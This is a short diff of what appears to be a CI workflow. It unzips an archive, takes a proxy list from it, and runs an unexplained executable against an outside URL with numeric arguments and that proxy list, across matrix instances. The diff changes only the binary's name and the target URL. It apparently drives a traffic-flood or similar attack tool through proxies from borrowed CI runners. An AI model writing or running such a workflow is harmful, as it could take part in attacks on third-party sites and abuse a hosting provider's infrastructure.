@@ -33,9 +33,9 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
-          chmod +x m
+          chmod +x tol
           
-          ./m https://rapidis.gay/6901966783-4f6a7bbb-d94e-473a-8ebb-c52e7aec4fcd 700 1 1 90.txt 
+          ./tol https://xpert.lol/6901966783-b4f19721-26aa-4f4e-a850-02414db09c9b 700 1 1 90.txt 
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
